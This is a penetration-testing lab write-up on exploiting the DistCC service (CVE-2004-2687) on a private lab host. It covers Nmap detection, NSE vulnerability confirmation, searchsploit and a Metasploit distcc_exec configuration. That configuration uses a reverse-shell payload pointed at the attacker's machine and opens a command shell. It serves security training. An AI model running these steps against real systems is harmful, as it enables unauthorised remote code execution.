# DistCC Enumeration

## Objective

Enumerate the DistCC service to determine its version, identify known vulnerabilities, and verify whether remote command execution is possible.

---

## Service Information

| Item | Value |
|------|-------|
| Service | DistCC |
| Port | 3632/TCP |
| Target | 192.168.56.104 |

---

# Why Enumerate DistCC?

DistCC is a distributed compiler service that allows remote compilation across multiple systems. Older versions are vulnerable to unauthenticated remote command execution (CVE-2004-2687) when improperly configured.

---

# Step 1 – Service Detection

### Command

```bash
nmap -sV -p3632 192.168.56.104
```

### Result

```
3632/tcp open  distccd
distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
```

### Observation

The target is running an outdated version of DistCC.

---

# Step 2 – Vulnerability Detection

### Command

```bash
nmap --script distcc-cve2004-2687 -p3632 192.168.56.104
```

### Result

```
VULNERABLE:
DistCC Daemon Command Execution

CVE-2004-2687

uid=1(daemon)
gid=1(daemon)
```

### Observation

The NSE script successfully executed the `id` command remotely, confirming that the service is vulnerable to unauthenticated remote command execution.

---

# Step 3 – Public Exploit Discovery

### Command

```bash
searchsploit distcc
```

### Result

```
DistCC Daemon - Command Execution (Metasploit)
```

### Observation

A public exploit is available for this vulnerability.

---

# Step 4 – Exploitation

### Metasploit Module

```
exploit/unix/misc/distcc_exec
```

### Configuration

```
set RHOSTS 192.168.56.104
set LHOST 192.168.56.103
set payload cmd/unix/reverse
run
```

### Result

```
Command shell session 1 opened
```

### Observation

The exploit successfully established a command shell session, confirming remote code execution.

---

# Security Analysis

The DistCC service allows unauthenticated users to execute arbitrary system commands remotely.

An attacker can leverage this vulnerability to:

- Execute operating system commands
- Gain an interactive shell
- Enumerate the operating system
- Perform privilege escalation
- Pivot to additional services

---

# Risk Assessment

| Risk | Level |
|------|-------|
| Remote Code Execution | Critical |
| Authentication Required | No |
| CVE | CVE-2004-2687 |

---

# Evidence Collected

- DistCC service detected
- Vulnerable version identified
- CVE confirmed through Nmap NSE
- Public exploit available
- Remote command shell successfully obtained

---

# Screenshots

Store screenshots in:

```
screenshots/distcc/
```

Suggested screenshots:

- nmap_service.png
- nmap_nse.png
- searchsploit.png
- msf_module.png
- shell_opened.png

---

# Conclusion

The DistCC service is critically vulnerable to CVE-2004-2687. Remote command execution was successfully demonstrated using the Metasploit `distcc_exec` module, proving that an unauthenticated attacker can execute commands on the target system.

---

# Next Step

Proceed with enumeration of the PostgreSQL service running on TCP port 5432.